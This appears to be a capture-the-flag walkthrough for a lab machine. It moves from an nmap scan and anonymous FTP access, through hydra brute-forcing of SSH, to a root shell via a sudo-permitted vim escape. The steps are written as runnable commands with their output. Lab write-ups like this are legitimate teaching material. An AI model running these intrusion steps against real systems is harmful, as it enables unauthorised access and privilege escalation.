1. Scan the network.

	$$ nmap -sV -Pn 10.10.238.31

	==> Starting Nmap 7.91 ( https://nmap.org ) 
		at 2022-02-06 08:46 UTC

		Nmap scan report for 10.10.238.31

		PORT     STATE SERVICE VERSION

		21/tcp   open  ftp     vsftpd 3.0.3
		80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
		2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

		Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


2. Access the FTP server.

	$$ ftp 10.10.238.31

	## login with name: anonymous.

	$$ ls
	$$ cd pub
	$$ ls
	$$ get ForMitch.txt

	## Now we know that the username is 'mitch'(ssh).


3. Bruit Forcing the ssh password.

	$$ hydra ssh://10.10.238.31:2222 -l mitch -P best110.txt -V -f

	==> [2222][ssh] host: 10.10.238.31   login: mitch   password: secret


4. Accessing the ssh server.

	$$ ssh mitch@10.10.238.31 -p 2222

	## Password: secret

	==> And we are now logedin.

	$$ ls
	$$ cat user.txt

	==> G00d j0b, keep up!


5. Find, What can you leverage to spawn a privileged shell.

	$$ sudo -l

	==> User mitch may run the following commands on Machine:
    	(root) NOPASSWD: /usr/bin/vim


6. Escalate your privilege using 'vim'.

	$$ sudo vim -c ':!/bin/bash'
	$$ id 

	==> uid=0(root) gid=0(root) groups=0(root)

	## And we are now root.

